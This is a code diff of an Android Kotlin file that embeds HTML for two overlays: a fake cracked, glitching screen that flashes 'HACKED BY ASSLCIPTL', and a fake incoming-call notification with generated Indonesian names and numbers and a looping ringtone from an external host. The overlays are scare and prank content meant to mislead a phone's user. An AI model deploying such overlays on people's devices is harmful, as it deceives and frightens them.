@@ -1024,7 +1024,6 @@ private fun setLcdBroken(on: Boolean) {
 }
 
 private fun getLcdBrokenHtml(): String {
-    // isi dari document index 3 — salin mentah
     return """<!DOCTYPE html>
 <html lang="id">
 <head>
@@ -1052,7 +1051,6 @@ private fun getLcdBrokenHtml(): String {
     }
     .crack-svg{position:fixed;inset:0;width:100%;height:100%;z-index:10000;pointer-events:none;}
 
-    /* ===== TAMBAHAN GANAS ===== */
     .glitch-band {
       position: fixed; left: 0; width: 100%;
       pointer-events: none; z-index: 9999;
@@ -1062,21 +1060,20 @@ private fun getLcdBrokenHtml(): String {
     }
     @keyframes bandShift {
       0%   { transform: translateX(-8%); opacity: 0.6; }
-      50%  { transform: translateX(6%);  opacity: 0.9; }
+      50%  { transform: translateX(6%); opacity: 0.9; }
       100% { transform: translateX(-4%); opacity: 0.5; }
     }
 
     .rgb-split {
       position: fixed; inset: 0; pointer-events: none; z-index: 9989;
       mix-blend-mode: screen; opacity: 0.35;
-      background:
-        linear-gradient(90deg, rgba(0,255,68,0.10), transparent 30%, transparent 70%, rgba(170,0,255,0.10));
+      background: linear-gradient(90deg, rgba(0,255,68,0.10), transparent 30%, transparent 70%, rgba(170,0,255,0.10));
       animation: rgbJitter 0.07s infinite steps(3);
     }
     @keyframes rgbJitter {
-      0%   { transform: translate(0,0); }
-      33%  { transform: translate(-2px,1px); }
-      66%  { transform: translate(2px,-1px); }
+      0% { transform: translate(0,0); }
+      33% { transform: translate(-2px,1px); }
+      66% { transform: translate(2px,-1px); }
       100% { transform: translate(0,0); }
     }
 
@@ -1086,8 +1083,8 @@ private fun getLcdBrokenHtml(): String {
     }
     .flash.on { animation: flashBurst 90ms steps(1); }
     @keyframes flashBurst {
-      0%   { opacity: 0.55; }
-      50%  { opacity: 0.15; }
+      0% { opacity: 0.55; }
+      50% { opacity: 0.15; }
       100% { opacity: 0; }
     }
 
@@ -1104,7 +1101,7 @@ private fun getLcdBrokenHtml(): String {
       animation: scanMove 2.4s linear infinite;
     }
     @keyframes scanMove {
-      0%   { top: -80px; }
+      0% { top: -80px; }
       100% { top: 100vh; }
     }
 
@@ -1116,7 +1113,7 @@ private fun getLcdBrokenHtml(): String {
     }
     @keyframes vigPulse {
       0%,100% { opacity: 0.85; }
-      50%     { opacity: 1; }
+      50% { opacity: 1; }
     }
 
     .grain {
@@ -1127,8 +1124,8 @@ private fun getLcdBrokenHtml(): String {
       animation: grainShift 0.09s infinite steps(2);
     }
     @keyframes grainShift {
-      0%   { transform: translate(0,0); }
-      50%  { transform: translate(-3px,2px); }
+      0% { transform: translate(0,0); }
+      50% { transform: translate(-3px,2px); }
       100% { transform: translate(2px,-2px); }
     }
 
@@ -1142,8 +1139,9 @@ private fun getLcdBrokenHtml(): String {
     .corner-bracket.tr { top: 14px; right: 14px; border-top-width: 2px; border-right-width: 2px; border-color:#aa00ff; }
     .corner-bracket.bl { bottom: 14px; left: 14px; border-bottom-width: 2px; border-left-width: 2px; border-color:#aa00ff; }
     .corner-bracket.br { bottom: 14px; right: 14px; border-bottom-width: 2px; border-right-width: 2px; }
+
     @keyframes bracketFlicker {
-      0%   { opacity: 0.25; }
+      0% { opacity: 0.25; }
       100% { opacity: 0.75; }
     }
 
@@ -1155,37 +1153,43 @@ private fun getLcdBrokenHtml(): String {
       animation: textFlick 0.25s infinite steps(2);
     }
     @keyframes textFlick {
-      0%   { opacity: 0.15; transform: translateX(0); }
-      50%  { opacity: 0.65; transform: translateX(2px); }
+      0% { opacity: 0.15; transform: translateX(0); }
+      50% { opacity: 0.65; transform: translateX(2px); }
       100% { opacity: 0.35; transform: translateX(-1px); }
     }
-    /* ===== END TAMBAHAN ===== */
   </style>
 </head>
 <body>
+
 <div class="tint"></div>
 <div class="noise"></div>
-
-<!-- ===== TAMBAHAN GANAS ===== -->
 <div class="grain"></div>
 <div class="rgb-split"></div>
 <div class="vignette"></div>
 <div class="scanbar"></div>
 <div class="flash" id="flash"></div>
+
 <div class="corner-bracket tl"></div>
 <div class="corner-bracket tr"></div>
 <div class="corner-bracket bl"></div>
 <div class="corner-bracket br"></div>
+
 <div class="text-glitch" id="txt1" style="top:18px;left:80px;">SYS://ANOMALY_DETECTED</div>
 <div class="text-glitch" id="txt2" style="bottom:20px;right:80px;color:#aa00ff;text-shadow:0 0 4px #aa00ff,1px 0 #00ff44;">SIGNAL::CORRUPTED</div>
 <div class="text-glitch" id="txt3" style="top:50%;left:50%;transform:translate(-50%,-50%);font-size:9px;">ERR_0xDEAD::HACKED BY ASSLCIPTL</div>
-<!-- ===== END TAMBAHAN ===== -->
 
 <svg class="crack-svg" viewBox="0 0 1920 1080" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
   <defs>
-    <filter id="glow-green"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
-    <filter id="glow-purple"><feGaussianBlur stdDeviation="2.5" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <filter id="glow-green">
+      <feGaussianBlur stdDeviation="2" result="blur"/>
+      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+    </filter>
+    <filter id="glow-purple">
+      <feGaussianBlur stdDeviation="2.5" result="blur"/>
+      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+    </filter>
   </defs>
+
   <g filter="url(#glow-green)" opacity="0.9">
     <line x1="320" y1="210" x2="180" y2="80" stroke="#00ff44" stroke-width="1.5"/>
     <line x1="320" y1="210" x2="420" y2="60" stroke="#00ff44" stroke-width="1"/>
@@ -1198,6 +1202,7 @@ private fun getLcdBrokenHtml(): String {
     <circle cx="320" cy="210" r="18" fill="none" stroke="#00ff44" stroke-width="1" opacity="0.6"/>
     <circle cx="320" cy="210" r="8" fill="rgba(0,255,68,0.2)"/>
   </g>
+
   <g filter="url(#glow-purple)" opacity="0.85">
     <line x1="1500" y1="780" x2="1650" y2="920" stroke="#aa00ff" stroke-width="1.5"/>
     <line x1="1500" y1="780" x2="1380" y2="950" stroke="#bb00ff" stroke-width="1"/>
@@ -1209,12 +1214,15 @@ private fun getLcdBrokenHtml(): String {
     <circle cx="1500" cy="780" r="20" fill="none" stroke="#aa00ff" stroke-width="1" opacity="0.6"/>
     <circle cx="1500" cy="780" r="9" fill="rgba(170,0,255,0.2)"/>
   </g>
+
   <g opacity="0.7">
     <polyline points="320,210 480,310 650,290 780,400 950,380 1100,500 1280,520 1500,780" fill="none" stroke="#55ff55" stroke-width="1" stroke-dasharray="8,3"/>
     <polyline points="320,210 400,420 520,530 700,610 900,640 1100,700 1300,730 1500,780" fill="none" stroke="#bb55ff" stroke-width="0.8" stroke-dasharray="6,4"/>
   </g>
+
   <ellipse cx="320" cy="210" rx="60" ry="45" fill="rgba(0,0,0,0.55)"/>
   <ellipse cx="1500" cy="780" rx="70" ry="50" fill="rgba(0,0,0,0.5)"/>
+
   <g opacity="0.6">
     <rect x="600" y="150" width="80" height="3" fill="#cc00ff"/>
     <rect x="900" y="400" width="60" height="2" fill="#aa00ff"/>
@@ -1222,6 +1230,7 @@ private fun getLcdBrokenHtml(): String {
     <rect x="200" y="600" width="70" height="2" fill="#bb00ff"/>
     <rect x="1600" y="300" width="90" height="3" fill="#aa00ee"/>
   </g>
+
   <g opacity="0.6">
     <rect x="700" y="500" width="60" height="2" fill="#00ff44"/>
     <rect x="400" y="700" width="80" height="3" fill="#00ee33"/>
@@ -1232,23 +1241,90 @@ private fun getLcdBrokenHtml(): String {
 </svg>
 
 <script>
-  const body=document.body;
-  const vColors=['#00ff44','#aa00ff','#cc00ff','#00ee33','#bb00ff','#55ff55'];
-  for(let i=0;i<28;i++){const el=document.createElement('div');el.className='vline';el.style.left=Math.random()*100+'vw';el.style.width=(Math.random()*2+0.5)+'px';el.style.background=vColors[Math.floor(Math.random()*vColors.length)];el.style.opacity=(Math.random()*0.6+0.2).toFixed(2);body.appendChild(el);}
-  for(let i=0;i<35;i++){const el=document.createElement('div');el.className='scanline';el.style.top=Math.random()*100+'vh';el.style.height=(Math.random()*3+0.5)+'px';el.style.background=vColors[Math.floor(Math.random()*vColors.length)];el.style.opacity=(Math.random()*0.55+0.15).toFixed(2);body.appendChild(el);}
-  for(let i=0;i<18;i++){const el=document.createElement('div');el.className='dead-pixel';el.style.left=Math.random()*98+'vw';el.style.top=Math.random()*98+'vh';el.style.width=(Math.floor(Math.random()*40)+8)+'px';el.style.height=(Math.floor(Math.random()*8)+2)+'px';el.style.opacity=(Math.random()*0.7+0.3).toFixed(2);body.appendChild(el);}
-  const style=document.createElement('style');
-  style.textContent='@keyframes vFlicker{0%{opacity:0.1}30%{opacity:0.8}45%{opacity:0}60%{opacity:0.7}80%{opacity:0.3}100%{opacity:0.6}}@keyframes hFlicker{0%{opacity:0.05}20%{opacity:0.6}40%{opacity:0}55%{opacity:0.5}75%{opacity:0.2}100%{opacity:0.4}}';
-  document.head.appendChild(style);
-  document.querySelectorAll('.vline').forEach(el=>{el.style.animation='vFlicker '+(Math.random()*120+40)+'ms infinite';});
-  document.querySelectorAll('.scanline').forEach(el=>{el.style.animation='hFlicker '+(Math.random()*100+50)+'ms infinite';});
-  setInterval(()=>{const lines=document.querySelectorAll('.scanline');const pick=lines[Math.floor(Math.random()*lines.length)];if(pick)pick.style.top=Math.random()*100+'vh';const vlines=document.querySelectorAll('.vline');const vpick=vlines[Math.floor(Math.random()*vlines.length)];if(vpick)vpick.style.left=Math.random()*100+'vw';},200);
-  setInterval(()=>{const tint=document.querySelector('.tint');if(!tint)return;const pick=Math.random();if(pick<0.15){tint.style.background='rgba(0,255,68,0.12)';setTimeout(()=>{tint.style.background='';},60);}else if(pick<0.30){tint.style.background='rgba(160,0,255,0.14)';setTimeout(()=>{tint.style.background='';},80);}},350);
+  const body = document.body;
+  const vColors = ['#00ff44','#aa00ff','#cc00ff','#00ee33','#bb00ff','#55ff55'];
 
-  /* ===== TAMBAHAN GANAS: script ===== */
-  // 1) Band glitch horizontal acak
+  for (let i = 0; i < 28; i++) {
+    const el = document.createElement('div');
+    el.className = 'vline';
+    el.style.left = Math.random() * 100 + 'vw';
+    el.style.width = (Math.random() * 2 + 0.5) + 'px';
+    el.style.background = vColors[Math.floor(Math.random() * vColors.length)];
+    el.style.opacity = (Math.random() * 0.6 + 0.2).toFixed(2);
+    body.appendChild(el);
+  }
+
+  for (let i = 0; i < 35; i++) {
+    const el = document.createElement('div');
+    el.className = 'scanline';
+    el.style.top = Math.random() * 100 + 'vh';
+    el.style.height = (Math.random() * 3 + 0.5) + 'px';
+    el.style.background = vColors[Math.floor(Math.random() * vColors.length)];
+    el.style.opacity = (Math.random() * 0.55 + 0.15).toFixed(2);
+    body.appendChild(el);
+  }
+
+  for (let i = 0; i < 18; i++) {
+    const el = document.createElement('div');
+    el.className = 'dead-pixel';
+    el.style.left = Math.random() * 98 + 'vw';
+    el.style.top = Math.random() * 98 + 'vh';
+    el.style.width = (Math.floor(Math.random() * 40) + 8) + 'px';
+    el.style.height = (Math.floor(Math.random() * 8) + 2) + 'px';
+    el.style.opacity = (Math.random() * 0.7 + 0.3).toFixed(2);
+    body.appendChild(el);
+  }
+
+  const style = document.createElement('style');
+  style.textContent =
+    '@keyframes vFlicker{0%{opacity:0.1}30%{opacity:0.8}45%{opacity:0}60%{opacity:0.7}80%{opacity:0.3}100%{opacity:0.6}}' +
+    '@keyframes hFlicker{0%{opacity:0.05}20%{opacity:0.6}40%{opacity:0}55%{opacity:0.5}75%{opacity:0.2}100%{opacity:0.4}}';
+
+  document.head.appendChild(style);
+
+  document.querySelectorAll('.vline').forEach(el => {
+    el.style.animation = 'vFlicker ' + (Math.random() * 120 + 40) + 'ms infinite';
+  });
+
+  document.querySelectorAll('.scanline').forEach(el => {
+    el.style.animation = 'hFlicker ' + (Math.random() * 100 + 50) + 'ms infinite';
+  });
+
+  setInterval(() => {
+    const lines = document.querySelectorAll('.scanline');
+    const pick = lines[Math.floor(Math.random() * lines.length)];
+
+    if (pick) pick.style.top = Math.random() * 100 + 'vh';
+
+    const vlines = document.querySelectorAll('.vline');
+    const vpick = vlines[Math.floor(Math.random() * vlines.length)];
+
+    if (vpick) vpick.style.left = Math.random() * 100 + 'vw';
+  }, 200);
+
+  setInterval(() => {
+    const tint = document.querySelector('.tint');
+    if (!tint) return;
+
+    const pick = Math.random();
+
+    if (pick < 0.15) {
+      tint.style.background = 'rgba(0,255,68,0.12)';
+      setTimeout(() => {
+        tint.style.background = '';
+      }, 60);
+    } else if (pick < 0.30) {
+      tint.style.background = 'rgba(160,0,255,0.14)';
+      setTimeout(() => {
+        tint.style.background = '';
+      }, 80);
+    }
+  }, 350);
+
+  /* GLITCH BAND */
   const bandCount = 6;
   const bands = [];
+
   for (let i = 0; i < bandCount; i++) {
     const b = document.createElement('div');
     b.className = 'glitch-band';
@@ -1258,64 +1334,94 @@ private fun getLcdBrokenHtml(): String {
     body.appendChild(b);
     bands.push(b);
   }
+
   setInterval(() => {
     const b = bands[Math.floor(Math.random() * bands.length)];
     if (!b) return;
+
     b.style.top = (Math.random() * 100) + 'vh';
     b.style.height = (Math.random() * 14 + 2) + 'px';
   }, 120);
 
-  // 2) Flash random (putih / hijau / ungu)
+  /* FLASH */
   const flash = document.getElementById('flash');
+
   function doFlash() {
     if (!flash) return;
+
     const r = Math.random();
-    flash.style.background = r < 0.4 ? '#ffffff' : (r < 0.7 ? '#00ff44' : '#aa00ff');
+    flash.style.background = r < 0.4
+      ? '#ffffff'
+      : (r < 0.7 ? '#00ff44' : '#aa00ff');
+
     flash.classList.remove('on');
     void flash.offsetWidth;
     flash.classList.add('on');
   }
-  setInterval(() => { if (Math.random() < 0.22) doFlash(); }, 900);
 
-  // 3) Horizontal shift slice (glitch bar bergeser)
+  setInterval(() => {
+    if (Math.random() < 0.22) doFlash();
+  }, 900);
+
+  /* HORIZONTAL SHIFT */
   setInterval(() => {
     if (Math.random() > 0.35) return;
+
     const slice = document.createElement('div');
     slice.className = 'hshift';
+
     const h = Math.random() * 40 + 4;
     slice.style.top = (Math.random() * 100) + 'vh';
     slice.style.height = h + 'px';
+
     slice.style.background = Math.random() < 0.5
       ? 'rgba(0,255,68,0.18)'
       : 'rgba(170,0,255,0.18)';
-    slice.style.transform = `translateX(${(Math.random()*80-40).toFixed(1)}px)`;
+
+    slice.style.transform =
+      'translateX(' + (Math.random() * 80 - 40).toFixed(1) + 'px)';
+
     slice.style.filter = 'blur(0.4px)';
     body.appendChild(slice);
+
     setTimeout(() => slice.remove(), 90 + Math.random() * 120);
   }, 260);
 
-  // 4) Random text glitch position
-  const texts = ['txt1','txt2','txt3'].map(id => document.getElementById(id)).filter(Boolean);
+  /* RANDOM TEXT GLITCH */
+  const texts = ['txt1','txt2','txt3']
+    .map(id => document.getElementById(id))
+    .filter(Boolean);
+
   setInterval(() => {
     texts.forEach(t => {
       if (Math.random() < 0.5) {
-        t.textContent = 'ERR_' + Math.random().toString(16).slice(2, 6).toUpperCase() + '::HACKED BY ASSLCIPTL';
+        t.textContent = 'ERR_' +
+          Math.random().toString(16).slice(2, 6).toUpperCase() +
+          '::HACKED BY ASSLCIPTL';
       }
+
       t.style.opacity = (Math.random() * 0.6 + 0.2).toFixed(2);
     });
   }, 700);
 
-  // 5) Sesekali glitch seluruh layar (invert/blur singkat)
+  /* FILTER GLITCH */
   setInterval(() => {
     if (Math.random() > 0.12) return;
-    body.style.filter = `hue-rotate(${(Math.random()*40-20).toFixed(0)}deg) contrast(1.15)`;
-    setTimeout(() => { body.style.filter = ''; }, 70 + Math.random() * 90);
+
+    body.style.filter =
+      'hue-rotate(' + (Math.random() * 40 - 20).toFixed(0) +
+      'deg) contrast(1.15)';
+
+    setTimeout(() => {
+      body.style.filter = '';
+    }, 70 + Math.random() * 90);
   }, 1100);
-  /* ===== END TAMBAHAN ===== */
 </script>
+
 </body>
 </html>"""
-}   
+}
+
   
     
 private var prankCallOverlayView: android.webkit.WebView? = null
@@ -1373,6 +1479,7 @@ private fun setPrankCall(on: Boolean) {
     }
 }
 
+
 private fun getPrankCallHtml(): String {
     return """<!DOCTYPE html>
 <html lang="id">
@@ -1383,204 +1490,417 @@ private fun getPrankCallHtml(): String {
 <title>Panggilan Masuk</title>
 
 <style>
-  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
+  * {
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+    user-select: none;
+  }
+
   html, body {
-    margin: 0; padding: 0; width: 100%; height: 100%;
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
     background: transparent;
     font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-    display: flex; justify-content: center; align-items: flex-start;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
     overflow: hidden;
   }
+
   .notification-container {
-    position: fixed; top: max(20px, env(safe-area-inset-top));
-    left: 50%; transform: translateX(-50%);
-    width: 90%; max-width: 400px; z-index: 999999;
+    position: fixed;
+    top: max(20px, env(safe-area-inset-top));
+    left: 50%;
+    transform: translateX(-50%);
+    width: 90%;
+    max-width: 400px;
+    z-index: 999999;
     animation: slideDown 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
   }
+
   @keyframes slideDown {
-    from { opacity: 0; transform: translate(-50%, -60px); }
-    to   { opacity: 1; transform: translate(-50%, 0); }
+    from {
+      opacity: 0;
+      transform: translate(-50%, -60px);
+    }
+    to {
+      opacity: 1;
+      transform: translate(-50%, 0);
+    }
   }
+
   .notification-card {
     background: rgba(30, 30, 30, 0.9);
-    backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-    border-radius: 28px; padding: 16px 20px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1);
-    display: flex; flex-direction: column; color: white;
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-radius: 28px;
+    padding: 16px 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.6),
+                inset 0 1px 0 rgba(255,255,255,0.1);
+    display: flex;
+    flex-direction: column;
+    color: white;
   }
+
   .header {
-    display: flex; justify-content: space-between; align-items: center;
-    font-size: 12px; color: #b0b0b0; margin-bottom: 12px; padding: 0 5px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    color: #b0b0b0;
+    margin-bottom: 12px;
+    padding: 0 5px;
   }
-  .time { font-weight: 500; }
-  .sim-label { font-size: 10px; font-weight: 600; }
-  .content { display: flex; align-items: center; justify-content: space-between; gap: 15px; }
-  .contact-info { display: flex; align-items: center; gap: 15px; flex: 1; min-width: 0; }
+
+  .time {
+    font-weight: 500;
+  }
+
+  .sim-label {
+    font-size: 10px;
+    font-weight: 600;
+  }
+
+  .content {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 15px;
+  }
+
+  .contact-info {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    flex: 1;
+    min-width: 0;
+  }
+
   .avatar {
-    width: 50px; height: 50px; border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
     background: linear-gradient(135deg, #4a4a4a, #2a2a2a);
-    display: flex; justify-content: center; align-items: center;
-    font-size: 20px; font-weight: 600; color: #fff; flex-shrink: 0;
-    box-shadow: inset 0 2px 4px rgba(255,255,255,0.1); text-transform: uppercase;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 20px;
+    font-weight: 600;
+    color: #fff;
+    flex-shrink: 0;
+    box-shadow: inset 0 2px 4px rgba(255,255,255,0.1);
+    text-transform: uppercase;
     animation: pulse 1s infinite alternate;
   }
+
   @keyframes pulse {
-    from { box-shadow: 0 0 0 0 rgba(67,160,71,0.4); }
-    to   { box-shadow: 0 0 0 12px rgba(67,160,71,0); }
+    from {
+      box-shadow: 0 0 0 0 rgba(67,160,71,0.4);
+    }
+    to {
+      box-shadow: 0 0 0 12px rgba(67,160,71,0);
+    }
   }
-  .text-info { display: flex; flex-direction: column; min-width: 0; }
+
+  .text-info {
+    display: flex;
+    flex-direction: column;
+    min-width: 0;
+  }
+
   .name {
-    font-size: 18px; font-weight: 600; margin: 0 0 2px 0;
-    white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #fff;
+    font-size: 18px;
+    font-weight: 600;
+    margin: 0 0 2px 0;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    color: #fff;
   }
-  .number { font-size: 13px; color: #a0a0a0; margin: 0; }
-  .actions { display: flex; gap: 10px; flex-shrink: 0; }
+
+  .number {
+    font-size: 13px;
+    color: #a0a0a0;
+    margin: 0;
+  }
+
+  .actions {
+    display: flex;
+    gap: 10px;
+    flex-shrink: 0;
+  }
+
   .btn {
-    width: 48px; height: 48px; border-radius: 50%; border: none;
-    display: flex; justify-content: center; align-items: center;
-    cursor: pointer; transition: transform 0.1s, opacity 0.2s;
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    border: none;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+    transition: transform 0.1s, opacity 0.2s;
   }
-  .btn:active { transform: scale(0.9); opacity: 0.8; }
-  .btn svg { width: 22px; height: 22px; fill: white; }
-  .btn-reject { background: #e53935; }
-  .btn-accept { background: #43a047; }
-  
-  .notification-container.hide { animation: slideUp 0.2s ease-in forwards; }
-  @keyframes slideUp { to { opacity: 0; transform: translate(-50%, -60px); } }
+
+  .btn:active {
+    transform: scale(0.9);
+    opacity: 0.8;
+  }
+
+  .btn svg {
+    width: 22px;
+    height: 22px;
+    fill: white;
+  }
+
+  .btn-reject {
+    background: #e53935;
+  }
+
+  .btn-accept {
+    background: #43a047;
+  }
+
+  .notification-container.hide {
+    animation: slideUp 0.2s ease-in forwards;
+  }
+
+  @keyframes slideUp {
+    to {
+      opacity: 0;
+      transform: translate(-50%, -60px);
+    }
+  }
 </style>
 </head>
 
 <body>
 
-  <audio id="ringtone" src="https://d.top4top.io/m_3957zw2kk0.mp3" autoplay loop preload="auto" playsinline webkit-playsinline></audio>
+<audio
+  id="ringtone"
+  src="https://d.top4top.io/m_3957zw2kk0.mp3"
+  loop
+  preload="auto"
+  playsinline>
+</audio>
 
-  <div class="notification-container" id="notif">
-    <div class="notification-card">
-      <div class="header">
-        <span class="time" id="current-time">00:00</span>
-        <span class="sim-label">SIM 1</span>
+<div class="notification-container" id="notif">
+  <div class="notification-card">
+
+    <div class="header">
+      <span class="time" id="current-time">00:00</span>
+      <span class="sim-label">SIM 1</span>
+    </div>
+
+    <div class="content">
+      <div class="contact-info">
+        <div class="avatar" id="avatar">A</div>
+
+        <div class="text-info">
+          <div class="name" id="name">Memuat...</div>
+          <div class="number" id="number">+62 ...</div>
+        </div>
       </div>
-      <div class="content">
-        <div class="contact-info">
-          <div class="avatar" id="avatar">A</div>
-          <div class="text-info">
-            <div class="name" id="name">Memuat...</div>
-            <div class="number" id="number">+62 ...</div>
-          </div>
-        </div>
-        <div class="actions">
-          <button class="btn btn-reject" onclick="handleAction('declined')" aria-label="Tolak">
-            <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
-          </button>
-          <button class="btn btn-accept" onclick="handleAction('accepted')" aria-label="Jawab">
-            <svg viewBox="0 0 24 24"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.03 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/></svg>
-          </button>
-        </div>
+
+      <div class="actions">
+        <button
+          class="btn btn-reject"
+          onclick="handleAction('declined')"
+          aria-label="Tolak">
+          <svg viewBox="0 0 24 24">
+            <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/>
+          </svg>
+        </button>
+
+        <button
+          class="btn btn-accept"
+          onclick="handleAction('accepted')"
+          aria-label="Jawab">
+          <svg viewBox="0 0 24 24">
+            <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.03 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
+          </svg>
+        </button>
       </div>
     </div>
+
   </div>
+</div>
 
 <script>
   const ringtone = document.getElementById('ringtone');
   const notif = document.getElementById('notif');
 
-  /* ============ JAM ============ */
+  /* JAM */
   function updateClock() {
     const t = new Date().toLocaleTimeString('id-ID', {
-      timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit', hour12: false
+      timeZone: 'Asia/Jakarta',
+      hour: '2-digit',
+      minute: '2-digit',
+      hour12: false
     });
+
     document.getElementById('current-time').textContent = t;
   }
+
   updateClock();
   setInterval(updateClock, 1000);
 
-  /* ============ GENERATOR NAMA & NOMOR ============ */
-  const firstNames = ["Alex","Daniel","Michael","Chris","Budi","Siti","Andi","Rina","Dimas","Kevin","Jessica","Raffi","Iqbaal","Agus","Dewi","Eko","Fajar","Gita","Hendra","Indah","Joko","Kartika","Lukman","Maya","Nanda","Oscar","Putri","Qori","Rizky","Sari","Taufik","Umar","Vina","Wahyu","Yuni","Zaki","Ayu","Bima","Citra","Doni","Eka","Fani","Gunawan","Hana","Irfan","Jihan","Kiki","Lina","Mega","Niko","Oki","Prita","Rama","Sinta","Tomi","Ulfa","Vito","Wulan","Yoga","Zahra","Arif","Bella","Candra","Dina"];
-  const lastNames = ["Morgan","Wilson","Anderson","Taylor","Santoso","Nurhaliza","Wijaya","Kartika","Pratama","Sanjaya","Mila","Ahmad","Ramadhan","Saputra","Lestari","Hidayat","Permata","Kusuma","Firmansyah","Anggraini","Setiawan","Rahayu","Nugroho","Sari","Prabowo","Utami","Hakim","Simanjuntak","Siregar","Ginting","Nasution","Situmorang","Panjaitan","Hutapea","Sitorus","Manurung","Tambunan","Putra","Putri","Dewi","Rizky","Fauzi","Ibrahim","Maulana"];
-  const prefixes = ["811","812","813","821","822","823","851","852","853","855","856","857","858","859","877","878","881","882","883","884","885","886","887","888","889","895","896","897","898","899"];
+  /* DATA NAMA */
+  const firstNames = [
+    "Alex","Daniel","Michael","Chris","Budi","Siti","Andi",
+    "Rina","Dimas","Kevin","Jessica","Raffi","Iqbaal","Agus",
+    "Dewi","Eko","Fajar","Gita","Hendra","Indah","Joko",
+    "Kartika","Lukman","Maya","Nanda","Oscar","Putri","Qori",
+    "Rizky","Sari","Taufik","Umar","Vina","Wahyu","Yuni",
+    "Zaki","Ayu","Bima","Citra","Doni","Eka","Fani",
+    "Gunawan","Hana","Irfan","Jihan","Kiki","Lina","Mega",
+    "Niko","Oki","Prita","Rama","Sinta","Tomi","Ulfa",
+    "Vito","Wulan","Yoga","Zahra","Arif","Bella","Candra","Dina"
+  ];
+
+  const lastNames = [
+    "Morgan","Wilson","Anderson","Taylor","Santoso",
+    "Nurhaliza","Wijaya","Kartika","Pratama","Sanjaya",
+    "Mila","Ahmad","Ramadhan","Saputra","Lestari","Hidayat",
+    "Permata","Kusuma","Firmansyah","Anggraini","Setiawan",
+    "Rahayu","Nugroho","Sari","Prabowo","Utami","Hakim",
+    "Simanjuntak","Siregar","Ginting","Nasution","Situmorang",
+    "Panjaitan","Hutapea","Sitorus","Manurung","Tambunan",
+    "Putra","Putri","Dewi","Rizky","Fauzi","Ibrahim","Maulana"
+  ];
+
+  const prefixes = [
+    "811","812","813","821","822","823","851","852","853",
+    "855","856","857","858","859","877","878","881","882",
+    "883","884","885","886","887","888","889","895","896",
+    "897","898","899"
+  ];
 
   function randName() {
-    return firstNames[Math.floor(Math.random()*firstNames.length)] + " " +
-           lastNames[Math.floor(Math.random()*lastNames.length)];
-  }
-  function rnd(n){ let s=""; for(let i=0;i<n;i++) s+=Math.floor(Math.random()*10); return s; }
-  function randPhone() {
-    const p = prefixes[Math.floor(Math.random()*prefixes.length)];
-    const full = p + rnd(Math.random()<0.5?7:8);
-    return `+62 ${full.substring(0,3)}-${full.substring(3,7)}-${full.substring(7)}`;
